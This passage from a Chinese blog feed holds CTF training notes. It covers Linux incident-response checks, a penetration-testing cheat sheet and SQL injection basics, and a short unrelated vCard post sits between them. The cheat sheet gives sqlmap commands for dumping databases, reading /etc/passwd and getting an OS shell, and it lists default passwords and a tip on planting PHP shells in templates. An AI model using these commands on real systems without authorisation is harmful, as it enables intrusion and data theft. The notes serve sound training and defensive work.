&lt;h1 id=&quot;4-查看某个时间段文件改动内容&quot;&gt;&lt;a href=&quot;#4-查看某个时间段文件改动内容&quot; class=&quot;headerlink&quot; title=&quot;4.查看某个时间段文件改动内容&quot;&gt;&lt;/a&gt;4.查看某个时间段文件改动内容&lt;/h1&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find / -&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; f -newermt &lt;span class=&quot;string&quot;&gt;&amp;quot;2021-08-20 00:00&amp;quot;&lt;/span&gt; -a -not -newermt &lt;span class=&quot;string&quot;&gt;&amp;quot;2021-08-20 23:59&amp;quot;&lt;/span&gt; 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find / -&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; f -newermt &lt;span class=&quot;string&quot;&gt;&amp;quot;2021-11-15 18:00&amp;quot;&lt;/span&gt; -a -not -newermt &lt;span class=&quot;string&quot;&gt;&amp;quot;2021-11-15 23:59&amp;quot;&lt;/span&gt; 2&amp;gt;/dev/null | grep /bin | xargs -I &amp;#123;&amp;#125; file &amp;#123;&amp;#125; | grep -v ELF | grep &lt;span class=&quot;string&quot;&gt;&amp;quot;Bourne-Again shell script, ASCII text executable&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;5-查看报错邮件&quot;&gt;&lt;a href=&quot;#5-查看报错邮件&quot; class=&quot;headerlink&quot; title=&quot;5.查看报错邮件&quot;&gt;&lt;/a&gt;5.查看报错邮件&lt;/h1&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="1-有提示看提示-没提示看网络连接"><a href="#1-有提示看提示-没提示看网络连接" class="headerlink" title="1.有提示看提示,没提示看网络连接"></a>1.有提示看提示,没提示看网络连接</h1><p>看网络进程</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antup</span><br></pre></td></tr></table></figure><h1 id="2-看用户"><a href="#2-看用户" class="headerlink" title="2.看用户"></a>2.看用户</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><h1 id="3-看定时任务"><a href="#3-看定时任务" class="headerlink" title="3.看定时任务"></a>3.看定时任务</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -u 用户</span><br></pre></td></tr></table></figure><h1 id="4-查看某个时间段文件改动内容"><a href="#4-查看某个时间段文件改动内容" class="headerlink" title="4.查看某个时间段文件改动内容"></a>4.查看某个时间段文件改动内容</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -newermt <span class="string">&quot;2021-08-20 00:00&quot;</span> -a -not -newermt <span class="string">&quot;2021-08-20 23:59&quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">find / -<span class="built_in">type</span> f -newermt <span class="string">&quot;2021-11-15 18:00&quot;</span> -a -not -newermt <span class="string">&quot;2021-11-15 23:59&quot;</span> 2&gt;/dev/null | grep /bin | xargs -I &#123;&#125; file &#123;&#125; | grep -v ELF | grep <span class="string">&quot;Bourne-Again shell script, ASCII text executable&quot;</span></span><br></pre></td></tr></table></figure><h1 id="5-查看报错邮件"><a href="#5-查看报错邮件" class="headerlink" title="5.查看报错邮件"></a>5.查看报错邮件</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lth /var/spool/mail/</span><br></pre></td></tr></table></figure><h1 id="6-命令篡改"><a href="#6-命令篡改" class="headerlink" title="6.命令篡改"></a>6.命令篡改</h1><p>可以使用busybox</p><h1 id="一些sh"><a href="#一些sh" class="headerlink" title="一些sh"></a>一些sh</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统日志，/var/log/message    secure    auth.log</span></span><br><span class="line"><span class="comment">#搜索所有ssh登录成功的主机</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log |grep <span class="string">&quot;Accepted&quot;</span></span><br><span class="line"><span class="comment">#搜索所有ssh登录失败的主机</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log |grep <span class="string">&quot;Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#统计ssh登录成功的ip的登录次数</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log |grep <span class="string">&quot;Accepted&quot;</span>|grep -o -E <span class="string">&quot;[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;&quot;</span>|<span class="built_in">sort</span> -n |<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -nr</span><br><span class="line"><span class="comment">#统计ip次数</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log|<span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f 1|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c |<span class="built_in">sort</span> -nr</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="赣银杯决赛赛前培训"><a href="#赣银杯决赛赛前培训" class="headerlink" title="赣银杯决赛赛前培训"></a>赣银杯决赛赛前培训</h1><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h1 id="一些工具包"><a href="#一些工具包" class="headerlink" title="一些工具包"></a>一些工具包</h1><p>链接：<a href="https://pan.baidu.com/s/1o9EI_azqWyl8PvdL5W2c7Q?pwd=qhtm">https://pan.baidu.com/s/1o9EI_azqWyl8PvdL5W2c7Q?pwd=qhtm</a></p><p>提取码：qhtm</p><p>包括：取证、渗透、漏洞利用工具包、GTFO【提权】、Dictionary【字典】</p><h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p><h1 id="win11"><a href="#win11" class="headerlink" title="win11"></a>win11</h1><p><a href="https://github.com/arch3rPro/Pentest-Windows">https://github.com/arch3rPro/Pentest-Windows</a></p><p>虚拟机下载</p><p>迅雷网盘(试运行阶段，采用迅雷网盘下载，一段时间没啥问题再换掉下面的123pan)</p><p>● 链接：<a href="https://pan.xunlei.com/s/VNx2MzYGQu_V_sykWgMBbTrzA1">https://pan.xunlei.com/s/VNx2MzYGQu_V_sykWgMBbTrzA1</a> 提取码：tgak</p><p>123盘链接郑重申明：123pan现在下载有流量限制（已经开始收割了），需要登录才能下载了，等我找到合适的网盘就换了</p><p>再次申明：不要扫码付费下载，不要扫码付费下载，不要扫码付费下载！！！</p><p>●Windows11 Penetration Suite Toolkit v2.2 (WSL) 【推荐】</p><p>○下载链接：<a href="https://www.123pan.com/s/q59KVv-T4Qpd.html">https://www.123pan.com/s/q59KVv-T4Qpd.html</a> 提取码:wpst</p><p>○文件大小：8.55GB，解压后：23.2GB</p><p>○SHA256：<br>7305DBFFF38EAAD59373C8232EB417F6E996A5E80F379D22688BAC0E7C8CA6A9</p><p>●Windows11 Penetration Suite Toolkit v2.2 (NoWSL) 【无WSL】</p><p>○下载链接：<a href="https://www.123pan.com/s/q59KVv-tvQpd.html">https://www.123pan.com/s/q59KVv-tvQpd.html</a> 提取码:wpst</p><p>○文件大小：7.13 GB，解压后：17.6GB</p><p>○SHA256：<br>D05F8366E1054911AAE885A61D2621786B74CC6050F55A66B90CE4EDD38CFD98</p><h1 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h1><h2 id="运维赛"><a href="#运维赛" class="headerlink" title="运维赛"></a>运维赛</h2><p>被攻击的机器</p><p>登录机器，分析攻击者行为，怎么进来、做了什么更改</p><p>对环境进行修复【攻击者留下的后门、源码本身就存在的漏洞】</p><p>机器一轮一轮地进行检测</p><p>成功加固，得到相应分输【不需要额外提交东西】</p><h2 id="渗透赛"><a href="#渗透赛" class="headerlink" title="渗透赛"></a>渗透赛</h2><p>一台正常的机器【含有漏洞】</p><p>扮演攻击者，从主机发现-&gt;漏洞利用-&gt;获取权限-&gt;权限提升-&gt;获取到flag文件</p><p>flag{xxxxxxx}</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="linux进程排查"><a href="#linux进程排查" class="headerlink" title="linux进程排查"></a>linux进程排查</h2><ul><li>linux网络排查</li><li>linux文件排查<ul><li>1.webshell</li><li>2.写了私钥文件</li><li>3.httpd.conf   conf.d</li><li>4.ls -&gt;  alias ls&#x3D;”ls&gt;&#x2F;dev&#x2F;null”</li><li>5.ps-&gt;ps_bak</li></ul></li></ul><p>思路：</p><pre><code>* 1.tar -czvf www.tar.gz  /var/www/html/*    打包网站直接扔D盾* 2.ls -altS /usr/sbin |* 3.head -30* 4.find   -newermt 2024-01-03   not newermt  找某个时间范围内的* 5.find / -mtime 7 –exec ls –l &#123;&#125; \;找7内修改的* 6.find / -perm –u=s –type f 2&gt;/dev/null找suid* 7.find / -name “.*” –mtime7 –exec –l &#123;&#125; \;    查找隐藏文件* 8.ls直接反弹shell，目标机器ls拷出来，和自己linux机器中的ls进行比对* 9.md5sum ls* 10.diff 1 2 </code></pre><h2 id="linux用户排查"><a href="#linux用户排查" class="headerlink" title="linux用户排查"></a>linux用户排查</h2><pre><code>* 1.可能存在后门用户* 2.grep :0 /etc/passwd* 3.cd /home/test    * a.cat /home/test/.bash_history* b.查看一下家目录有没有奇怪文件* 4.userdel 删除用户* 5.直接到/etc/passwd删除该用户行* 6.cat /etc/passwd | awk -F: &#39;&#123;print $7&#125;&#39; | sort | uniq -c      * 7.查看有sudo权限的用户【权限排查】* a.more /etc/sudoers | egrep -v &quot;^#|^$&quot;* b.grep wheel /etc/group   排查指定组的用户或者指定用户* 8.cat ~/ .bash_history   历史命令</code></pre><h2 id="linux持久化排查"><a href="#linux持久化排查" class="headerlink" title="linux持久化排查"></a>linux持久化排查</h2><pre><code>* 1.crontab -l  列出定时任务* 2./var/spool/cron/crontabs* 3.检测到可疑的定时任务:    * a.crontab -r删除    * b.进到文件，直接删除指定行就可以* 4./etc/rc.d/*   【排查启动项】先runlevel查看一下启动级别    * a.➢ /etc/rc.local    * b.➢ /etc/rc[0-6].d    * c.➢ /etc/inittab</code></pre><h2 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h2><ul><li>1.web服务日志<ul><li>a.apache  nginx    cd &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</li></ul></li><li>2.登录日志<ul><li>a.&#x2F;var&#x2F;log&#x2F;auth.log</li><li>b.&#x2F;var&#x2F;log&#x2F;secure</li><li>c.&#x2F;var&#x2F;log&#x2F;wtmp</li><li>d.排查一下日志里面有没有脚本</li></ul></li><li>3.应用日志<ul><li>a.&#x2F;var&#x2F;log&#x2F;messages：内核及公共消息日志</li><li>b.➢ &#x2F;var&#x2F;log&#x2F;cron：计划任务日志</li><li>c.➢ &#x2F;var&#x2F;log&#x2F;dmesg：系统引导日志</li><li>d.➢ &#x2F;var&#x2F;log&#x2F;maillog：邮件系统日志</li><li>e.➢ &#x2F;var&#x2F;log&#x2F;lastlog：用户登录日志</li><li>f.➢ &#x2F;var&#x2F;log&#x2F;boot.log：记录系统在引导过程中发生的时间</li><li>g.➢ &#x2F;var&#x2F;log&#x2F;secure：用户验证相关的安全性事件</li><li>h.➢ &#x2F;var&#x2F;log&#x2F;wtmp：当前登录用户详细信息</li><li>i.➢ &#x2F;var&#x2F;log&#x2F;btmp：记录失败的的记录</li><li>j.➢ &#x2F;var&#x2F;run&#x2F;utmp：用户登录、注销及系统开、关等事件；</li></ul></li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>exploit-suggester</li><li>linuxenum</li></ul><p>直接搜索”linux提权工具、linux系统信息收集”</p><p>LinPeas: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p><p>● LinEnum: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><a href="https://github.com/rebootuser/LinEnum"></a></p><p>● LES (Linux Exploit Suggester): <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>● Linux Smart Enumeration: <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p>● Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li>1.主动<ul><li>a.精准度比较好，直接与目标交互，容易被发现</li></ul></li><li>2.被动<ul><li>a.隐蔽性比较好，第三方交互、精准度较差</li></ul></li></ul><h3 id="端口扫描【-主机探测】"><a href="#端口扫描【-主机探测】" class="headerlink" title="端口扫描【+主机探测】"></a>端口扫描【+主机探测】</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP x.x.x.0/24   探测主机存活</span><br><span class="line">nmap -sS -p- x.x.x.x -Pn  使用syn半开放扫主机【默认存活】【扫全端口】</span><br><span class="line">nmap -sV -A x.x.x.x 21,22,3306,1443   精细探测服务【名称、版本、可能的漏洞】</span><br><span class="line"></span><br><span class="line">arp-scan -l   捕获局域网流量，探测存活主机</span><br><span class="line">arp-scan -l -i eth0 j 监听某张网卡</span><br></pre></td></tr></table></figure><h3 id="敏感文件探测"><a href="#敏感文件探测" class="headerlink" title="敏感文件探测"></a>敏感文件探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.dirsearch</span><br><span class="line">    a.dirsearch -u http://xxx -e * -t 20 -i 200  -x  500 400</span><br><span class="line">    b.--delay 0.7</span><br><span class="line">    c.dirsearch -u http://xxxx -e * -t 200</span><br><span class="line">2.dirb</span><br><span class="line">    a.dirb http://xxxxxx</span><br><span class="line">3.dirbuster(kali有)</span><br><span class="line">    a.字典比较好用，可以结合其他工具指定字典使用</span><br><span class="line">    b./usr/share/wordlists/dirbuster </span><br><span class="line">4.gobuster</span><br><span class="line">5.burpsuite</span><br><span class="line">6.御剑</span><br><span class="line">7.敏感文件</span><br><span class="line">    a.www.zip</span><br><span class="line">    b.index.php.bak</span><br><span class="line">    c.robots.txt</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>工具</p><p>1.通用漏洞扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fscan:   fscan64 -h x.x.x.x</span><br><span class="line">nessus:</span><br><span class="line">awvs:</span><br><span class="line">netsparker:</span><br><span class="line">nmap --script &quot;漏洞检测脚本&quot;</span><br></pre></td></tr></table></figure><p>2.漏洞利用工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a.sqlmap</span><br><span class="line">【get注入】sqlmap -u http://xxxxx?id=sss </span><br><span class="line">sqlmap -u http://xxxxx?id=sss --dbms mysql --dbs</span><br><span class="line">sqlmap -u http://xxxxx?id=sss --dbms mysql -D 数据库名 --tables </span><br><span class="line">sqlmap -u http://xxxxx?id=sss --dbms mysql -D 数据库名 -T 数据表名 --columns</span><br><span class="line">sqlmap -u http://xxxxx?id=sss --dbms mysql -D 数据库名 -T 数据表名 -C id --dump</span><br><span class="line"></span><br><span class="line">sqlmap -u http://xxxx   --file-read  &quot;/etc/passwd&quot;</span><br><span class="line">sqlmap -u http://xxxx   --os-shell   获取系统权限</span><br><span class="line"></span><br><span class="line">【post注入】输参数之后，burp抓包</span><br><span class="line">右键 save to item/copy to file   保存到本地   1.txt</span><br><span class="line">sqlmap -r 1.txt  --dbs  步骤同上【加载请求包，对其中所有字段进行注入尝试】</span><br><span class="line"></span><br><span class="line">b.wpscan</span><br><span class="line">i.wpscan --url http://xxxxx</span><br></pre></td></tr></table></figure><p>3.弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.root/root</span><br><span class="line">b.admin/admin</span><br><span class="line">c.admin/password123</span><br></pre></td></tr></table></figure><p>获取权限的下一步操作</p><p>1.theme</p><pre><code>a.往主页、或者html、php模板中插入php代码b.访问主页时即可连接shell</code></pre><p>2.文件上传</p><p>3.命令执行漏洞<br>【www-data】</p><pre><code>1.sudo -l 2.find 找一下有没有suid提权3.直接上传linux信息收集工具</code></pre><p>有没有私钥登录，有没有其他用户，有没有其他敏感文件&#x2F;tmp<br>检查crontabs有没有定时任务，内核提权</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E5%BA%94%E6%80%A5/">应急</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/07/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%94%EF%BC%89-%E5%BA%94%E6%80%A5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的前端之旅（二十九）——vCard电子名片</title>
      <link>http://blog.xingxiaowu.cn/2024/07/05/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94vCard/</link>
      <guid>http://blog.xingxiaowu.cn/2024/07/05/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94vCard/</guid>
      <pubDate>Fri, 05 Jul 2024 10:23:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;最近同事给我发了一张“电子名片”&lt;/p&gt;
&lt;p&gt;照片上有一个二维码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E5%89%8D%E7%AB%AF28/20240718155130.png&quot; alt=&quot;名片&quot;&gt;&lt;/p&gt;
&lt;p&gt;大伙可以用微信扫这个二维码看看&lt;/p&gt;
&lt;p&gt;看看是不是很有意思&lt;/p&gt;
&lt;p&gt;其实非常简单&lt;/p&gt;
&lt;p&gt;大家只要搜索&lt;code&gt;vCard&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;就能找到这个标准格式&lt;/p&gt;
&lt;p&gt;不过标准都有点麻烦&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近同事给我发了一张“电子名片”</p><p>照片上有一个二维码</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E5%89%8D%E7%AB%AF28/20240718155130.png" alt="名片"></p><p>大伙可以用微信扫这个二维码看看</p><p>看看是不是很有意思</p><p>其实非常简单</p><p>大家只要搜索<code>vCard</code></p><p>就能找到这个标准格式</p><p>不过标准都有点麻烦</p><p>以下是我这个二维码的生成内容</p><p>我使用的是3.0版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BEGIN:VCARD</span><br><span class="line">VERSION:3.0</span><br><span class="line">URL:https://blog.xingxiaowu.cn</span><br><span class="line">PHOTO;TYPE=PNG;VALUE=URI:https://blog.xingxiaowu.cn/images/headerPic.png</span><br><span class="line">FN;CHARSET=UTF-8:无星</span><br><span class="line">TEL;TYPE=CELL:110</span><br><span class="line">TEL;TYPE=WORK:110</span><br><span class="line">ORG;CHARSET=UTF-8:吹牛逼有限公司</span><br><span class="line">TITLE:董事长</span><br><span class="line">ADR;TYPE=WORK;UTF-8:宇宙大街11号</span><br><span class="line">EMAIL;TYPE=internet:chuiniubi@nc.com</span><br><span class="line">ID:000000001##000000001</span><br><span class="line">END:VCARD</span><br></pre></td></tr></table></figure><p>不过微信扫码有1个点要注意</p><p><a href="https://developers.weixin.qq.com/community/minihome/doc/000e26e88f4bf02d6f6fea2d25e400">微信扫描vCard格式的二维码为什么中文和URL(主页)共存就会无法成功识别?</a></p><p>答案是：URL放中文签前面</p><p>另外还有个问题，微信扫码的头像怎么添加上去？有知道的老哥可以评论区说说</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%89%8D%E7%AB%AF/">前端</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/07/05/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94vCard/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>赣银杯赛前培训</title>
      <link>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/</link>
      <guid>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/</guid>
      <pubDate>Wed, 26 Jun 2024 12:17:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select password from users where id = &amp;quot;xiaoming&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;select password from users where id = &amp;quot;&amp;quot; or 1=1#&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;information_schema&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;schemata&lt;/th&gt;
&lt;th&gt;tables&lt;/th&gt;
&lt;th&gt;columns&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;数据库名&lt;/td&gt;
&lt;td&gt;schema_name&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;表名&lt;/td&gt;
&lt;td&gt;table_schema&lt;/td&gt;
&lt;td&gt;table_name&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字段名&lt;/td&gt;
&lt;td&gt;table_schema&lt;/td&gt;
&lt;td&gt;table_name&lt;/td&gt;
&lt;td&gt;column_name&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;nianji&lt;/p&gt;
&lt;p&gt;liuyi&lt;/p&gt;
&lt;p&gt;name&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select name from nianji.liuyi;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;联合注入&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select id,username,password from users union select 1,2,3;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;xiaoming&lt;/td&gt;
&lt;td&gt;xiaoming&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</description>
      
      
      
